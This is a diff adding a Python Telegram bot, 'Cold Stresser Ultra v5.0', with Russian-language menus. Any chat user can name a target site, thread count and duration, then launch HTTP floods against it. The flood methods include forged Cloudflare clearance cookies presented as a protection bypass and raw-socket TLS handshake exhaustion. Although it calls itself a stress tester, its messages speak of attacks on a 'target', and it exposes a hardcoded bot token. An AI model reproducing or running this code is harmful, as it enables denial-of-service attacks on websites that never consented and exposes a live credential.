@@ -1,0 +1,334 @@
+import logging
+import asyncio
+import aiohttp
+import time
+import random
+import os
+import urllib.parse
+import ssl
+from collections import defaultdict
+from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
+from telegram.ext import (
+    ApplicationBuilder,
+    CommandHandler,
+    ContextTypes,
+    CallbackQueryHandler,
+    MessageHandler,
+    filters,
+)
+
+# --- КОНФИГУРАЦИЯ ---
+BOT_TOKEN = "8758449437:AAH0lcEt1To57-x2FOdvcuaS7xZSY8FBgow"
+
+logging.basicConfig(level=logging.INFO)
+logger = logging.getLogger(__name__)
+
+# Реалистичные заголовки
+USER_AGENTS = [
+    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36",
+    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36",
+    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36",
+    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Mobile/15E148 Safari/604.1"
+]
+
+active_tests = {}
+user_forms = {}
+
+# --- ДВИЖОК СТРЕСС-ТЕСТА (УЛУЧШЕННЫЙ) ---
+
+class AdvancedTester:
+    def __init__(self, url: str, threads: int, duration: int, method: str):
+        if not url.startswith("http"):
+            url = "https://" + url
+        self.url = url
+        self.threads = min(threads, 500) # Ограничиваем до 500 для стабильности ОС
+        self.duration = duration
+        self.method = method
+        self._is_running = False
+        self._start_time = 0.0
+        self.stats = {"sent": 0, "ok": 0, "err": 0, "codes": defaultdict(int)}
+
+    def get_headers(self):
+        h = {
+            "User-Agent": random.choice(USER_AGENTS),
+            "Accept": "text/html,application/xhtml+xml,xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
+            "Accept-Language": "ru-RU,ru;q=0.9,en-US;q=0.8",
+            "Accept-Encoding": "gzip, deflate",
+            "Cache-Control": "no-cache",
+            "Connection": "keep-alive" if self.method != "tls" else "close"
+        }
+        if self.method in ["kittyofb", "kittyflood", "httpbypass"]:
+            h["Cookie"] = f"cf_clearance={os.urandom(16).hex()}; __cf_bm={os.urandom(20).hex()}"
+            h["Referer"] = "https://www.google.com/"
+        return h
+
+    async def _aiohttp_worker(self, session: aiohttp.ClientSession):
+        """Воркер для стандартных L7 методов через aiohttp"""
+        timeout = aiohttp.ClientTimeout(total=4)
+        while self._is_running:
+            try:
+                async with session.get(self.url, headers=self.get_headers(), timeout=timeout, ssl=False) as r:
+                    await r.read()
+                    self._log(r.status)
+            except asyncio.CancelledError:
+                break
+            except Exception:
+                self.stats["sent"] += 1
+                self.stats["err"] += 1
+            await asyncio.sleep(0.01)
+
+    async def _raw_worker(self):
+        """Воркер на сырых сокетах для pussyraw и tls"""
+        parsed = urllib.parse.urlparse(self.url)
+        host = parsed.hostname
+        port = parsed.port or (443 if parsed.scheme == 'https' else 80)
+        path = parsed.path or "/"
+        if parsed.query: path += "?" + parsed.query
+        
+        ssl_ctx = False
+        if parsed.scheme == 'https':
+            ssl_ctx = ssl.create_default_context()
+            ssl_ctx.check_hostname = False
+            ssl_ctx.verify_mode = ssl.CERT_NONE
+
+        payload = f"GET {path} HTTP/1.1\r\nHost: {host}\r\nUser-Agent: {random.choice(USER_AGENTS)}\r\nConnection: keep-alive\r\n\r\n".encode()
+
+        while self._is_running:
+            writer = None
+            try:
+                reader, writer = await asyncio.wait_for(
+                    asyncio.open_connection(host, port, ssl=ssl_ctx), 
+                    timeout=3
+                )
+                writer.write(payload)
+                await writer.drain()
+                
+                if self.method == "tls":
+                    self.stats["sent"] += 1
+                    self.stats["ok"] += 1
+                else:
+                    await asyncio.wait_for(reader.read(128), timeout=2)
+                    self.stats["sent"] += 1
+                    self.stats["ok"] += 1
+            except asyncio.CancelledError:
+                break
+            except Exception:
+                self.stats["sent"] += 1
+                self.stats["err"] += 1
+            finally:
+                if writer:
+                    writer.close()
+                    try: await writer.wait_closed()
+                    except: pass
+            await asyncio.sleep(0.01)
+
+    def _log(self, status):
+        self.stats["sent"] += 1
+        self.stats["codes"][status] += 1
+        if 200 <= status < 400: self.stats["ok"] += 1
+        else: self.stats["err"] += 1
+
+    async def start(self):
+        self._is_running = True
+        self._start_time = time.time()
+        tasks = []
+        
+        try:
+            if self.method in ["pussyraw", "tls"]:
+                tasks = [asyncio.create_task(self._raw_worker()) for _ in range(self.threads)]
+                end_time = self._start_time + self.duration
+                while self._is_running and time.time() < end_time:
+                    await asyncio.sleep(0.5)
+            else:
+                conn = aiohttp.TCPConnector(limit=0, ssl=False)
+                async with aiohttp.ClientSession(connector=conn) as session:
+                    tasks = [asyncio.create_task(self._aiohttp_worker(session)) for _ in range(self.threads)]
+                    end_time = self._start_time + self.duration
+                    while self._is_running and time.time() < end_time:
+                        await asyncio.sleep(0.5)
+
+        except Exception as e:
+            logger.error(f"Критическая ошибка движка: {e}")
+        finally:
+            self._is_running = False
+            for t in tasks: 
+                t.cancel()
+            if tasks:
+                await asyncio.gather(*tasks, return_exceptions=True)
+
+    def get_text(self, final=False):
+        el = time.time() - self._start_time if self._start_time > 0 else 0
+        if final or el > self.duration:
+            el = float(self.duration)
+            
+        rps = self.stats["sent"] / el if el > 0 else 0.0
+        icon = "✅" if final else "🔥"
+        status_title = "ФИНАЛЬНЫЙ ОТЧЕТ" if final else "АТАКА В ПРОЦЕССЕ"
+        
+        res = (
+            f"{icon} {status_title}\n"
+            f"━━━━━━━━━━━━━━━\n"
+            f"🎯 Цель: {self.url}\n"
+            f"⚔️ Метод: {self.method}\n"
+            f"⏱ Время: {el:.1f}/{self.duration}с\n"
+            f"📈 RPS: {rps:.1f}\n"
+            f"✅ OK: {self.stats['ok']} | ❌ ERR: {self.stats['err']}\n"
+            f"━━━━━━━━━━━━━━━\n"
+        )
+        return res
+
+# --- ТЕЛЕГРАМ ИНТЕРФЕЙС ---
+
+async def send_main_menu(chat_id, context, edit_id=None):
+    text = "🚀 **Cold Stresser Ultra v5.0**\nВыберите действие:"
+    kb = InlineKeyboardMarkup([
+        [InlineKeyboardButton("⚔️ Начать атаку", callback_data="step_url")],
+        [InlineKeyboardButton("ℹ️ Информация", callback_data="info")]
+    ])
+    if edit_id:
+        try: await context.bot.edit_message_text(text, chat_id=chat_id, message_id=edit_id, reply_markup=kb, parse_mode="Markdown")
+        except: await context.bot.send_message(chat_id, text, reply_markup=kb, parse_mode="Markdown")
+    else:
+        await context.bot.send_message(chat_id, text, reply_markup=kb, parse_mode="Markdown")
+
+async def callback_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    q = update.callback_query
+    cid = q.message.chat_id
+    await q.answer()
+
+    if q.data == "step_url":
+        user_forms[cid] = {"step": "url", "msg_id": q.message.message_id}
+        await q.edit_message_text("🔗 **Введите адрес цели:**\n(Например: `site.com`)", parse_mode="Markdown")
+    
+    elif q.data == "menu":
+        await send_main_menu(cid, context, q.message.message_id)
+
+    elif q.data == "info":
+        await q.edit_message_text("ℹ️ **Cold Stresser Ultra v5**\n\n• Добавлены сырые сокеты\n• Обход невалидного SSL\n• Улучшена стабильность потоков", 
+                                  reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🏠 В меню", callback_data="menu")]]),
+                                  parse_mode="Markdown")
+
+    elif q.data.startswith("set_method_"):
+        method = q.data.split("_")[2]
+        user_forms[cid]["method"] = method
+        f = user_forms[cid]
+        
+        descs = {
+            "kittyofb": "Обход Cloudflare через эмуляцию куков (GET).",
+            "kittyflood": "Мощный обход защиты Cloudflare (Flood).",
+            "pussykiller": "Высокоскоростной приватный HTTP флуд.",
+            "pussyraw": "Прямые HTTP RAW запросы (макс. скорость, сырые сокеты).",
+            "tls": "Атака на истощение TLS рукопожатий (сырые сокеты).",
+            "http2": "Флуд запросами через мультиплексирование.",
+            "httpbypass": "Универсальный метод обхода фильтров."
+        }
+        
+        text = (f"⚠️ **ПОДТВЕРЖДЕНИЕ ПАРАМЕТРОВ**\n\n"
+                f"🎯 Цель: `{f['url']}`\n"
+                f"🧵 Потоки: `{f['threads']}`\n"
+                f"⏱ Время: `{f['duration']}с`\n"
+                f"⚔️ Метод: `{method}`\n\n"
+                f"📖 **Описание:** {descs.get(method)}")
+        
+        kb = InlineKeyboardMarkup([
+            [InlineKeyboardButton("🔥 ЗАПУСТИТЬ", callback_data="run")],
+            [InlineKeyboardButton("🔄 Изменить метод", callback_data="change_method")],
+            [InlineKeyboardButton("❌ Отмена", callback_data="menu")]
+        ])
+        await q.edit_message_text(text, reply_markup=kb, parse_mode="Markdown")
+
+    elif q.data == "change_method":
+        await show_methods_kb(cid, context, user_forms[cid]["msg_id"])
+
+    elif q.data == "run":
+        f = user_forms.get(cid)
+        if not f or cid in active_tests: return
+        tester = AdvancedTester(f["url"], f["threads"], f["duration"], f["method"])
+        active_tests[cid] = tester
+        await q.edit_message_text("🚀 Подготовка сетевых интерфейсов...")
+        asyncio.create_task(attack_loop(q, tester, cid, context))
+
+    elif q.data == "stop":
+        tester = active_tests.get(cid)
+        if tester:
+            tester._is_running = False
+            await q.answer("🛑 Останавливаю атаку...", show_alert=True)
+
+async def show_methods_kb(cid, context, msg_id):
+    kb = InlineKeyboardMarkup([
+        [InlineKeyboardButton("🐱 kittyofb", callback_data="set_method_kittyofb"), InlineKeyboardButton("🐱 kittyflood", callback_data="set_method_kittyflood")],
+        [InlineKeyboardButton("💀 pussykiller", callback_data="set_method_pussykiller"), InlineKeyboardButton("🔥 pussyraw", callback_data="set_method_pussyraw")],
+        [InlineKeyboardButton("🔒 tls", callback_data="set_method_tls"), InlineKeyboardButton("⚡ http2", callback_data="set_method_http2")],
+        [InlineKeyboardButton("🛡 httpbypass", callback_data="set_method_httpbypass")]
+    ])
+    await context.bot.edit_message_text("⚙️ **Выберите Layer 7 Метод:**", chat_id=cid, message_id=msg_id, reply_markup=kb, parse_mode="Markdown")
+
+async def message_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    cid = update.effective_chat.id
+    if cid not in user_forms: return
+    val = update.message.text
+    f = user_forms[cid]
+    try: await update.message.delete()
+    except: pass
+
+    if f["step"] == "url":
+        f["url"] = val
+        f["step"] = "threads"
+        await context.bot.edit_message_text(f"✅ Цель: `{val}`\n\n🔢 **Потоки (1-500):**", chat_id=cid, message_id=f["msg_id"], parse_mode="Markdown")
+    
+    elif f["step"] == "threads":
+        if not val.isdigit(): return
+        f["threads"] = int(val)
+        f["step"] = "duration"
+        await context.bot.edit_message_text(f"✅ Потоков: `{val}`\n\n⏱ **Время (10-3600с):**", chat_id=cid, message_id=f["msg_id"], parse_mode="Markdown")
+    
+    elif f["step"] == "duration":
+        if not val.isdigit(): return
+        f["duration"] = int(val)
+        f["step"] = "method"
+        await show_methods_kb(cid, context, f["msg_id"])
+
+async def attack_loop(query, tester, cid, context):
+    attack_task = asyncio.create_task(tester.start())
+    kb = InlineKeyboardMarkup([[InlineKeyboardButton("🛑 ОСТАНОВИТЬ АТАКУ", callback_data="stop")]])
+    
+    await asyncio.sleep(1)
+    
+    try:
+        # Цикл обновления сообщения
+        while not attack_task.done() and tester._is_running:
+            try:
+                await query.edit_message_text(tester.get_text(), reply_markup=kb)
+            except Exception:
+                pass
+            await asyncio.sleep(3.5) # Немного увеличил задержку для стабильности API
+            
+    finally:
+        # Принудительная остановка, если цикл прерван кнопкой
+        tester._is_running = False
+        if not attack_task.done():
+            attack_task.cancel()
+            try: await attack_task
+            except asyncio.CancelledError: pass
+
+    # Финальный отчет
+    try:
+        await query.edit_message_text(tester.get_text(final=True), 
+                                     reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🏠 В меню", callback_data="menu")]]))
+    except: pass
+    
+    active_tests.pop(cid, None)
+    if cid in user_forms:
+        user_forms.pop(cid, None)
+
+def main():
+    app = ApplicationBuilder().token(BOT_TOKEN).build()
+    app.add_handler(CommandHandler("start", lambda u, c: asyncio.create_task(send_main_menu(u.effective_chat.id, c))))
+    app.add_handler(CallbackQueryHandler(callback_handler))
+    app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, message_handler))
+    print("Бот запущен. Движок v5 активен.")
+    app.run_polling()
+
+if __name__ == "__main__":
+    main()
+    
